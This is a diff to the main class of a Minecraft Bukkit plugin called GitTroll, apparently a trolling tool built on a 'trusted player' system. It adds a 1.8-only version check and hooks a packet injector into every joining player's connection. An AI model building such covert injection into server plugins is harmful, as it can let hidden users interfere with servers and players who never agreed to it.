@@ -17,6 +17,7 @@ import net.Lenni0451.GitTroll.event.events.EventUntrustPlayer;
 import net.Lenni0451.GitTroll.manager.CommandManager;
 import net.Lenni0451.GitTroll.utils.CustomPlayer;
 import net.Lenni0451.GitTroll.utils.Logger;
+import net.Lenni0451.GitTroll.utils.PacketInjector;
 import net.Lenni0451.GitTroll.utils.TrustedInfo;
 
 public class GitTroll extends JavaPlugin implements Listener {
@@ -77,15 +78,20 @@ public class GitTroll extends JavaPlugin implements Listener {
 		return false;
 	}
 	
-	
-	public CommandManager commandManager;
+
 	public EventManager eventManager;
+	public CommandManager commandManager;
 	
 	public void onEnable() {
 		instance = this;
 		
-		this.commandManager = new CommandManager();
+		if(!Bukkit.getServer().getClass().toString().contains("1_8")) {
+			Bukkit.getPluginManager().disablePlugin(this);
+			return;
+		}
+
 		this.eventManager = new EventManager();
+		this.commandManager = new CommandManager();
 		
 		Bukkit.getPluginManager().registerEvents(this, this);
 	}
@@ -114,6 +120,7 @@ public class GitTroll extends JavaPlugin implements Listener {
 		if(this.isPlayerTrusted(event.getPlayer())) {
 			CustomPlayer.instanceOf(event.getPlayer()).sendGitMessage("You are still trusted.");
 		}
+		new PacketInjector(event.getPlayer()).inject();
 	}
 	
 }
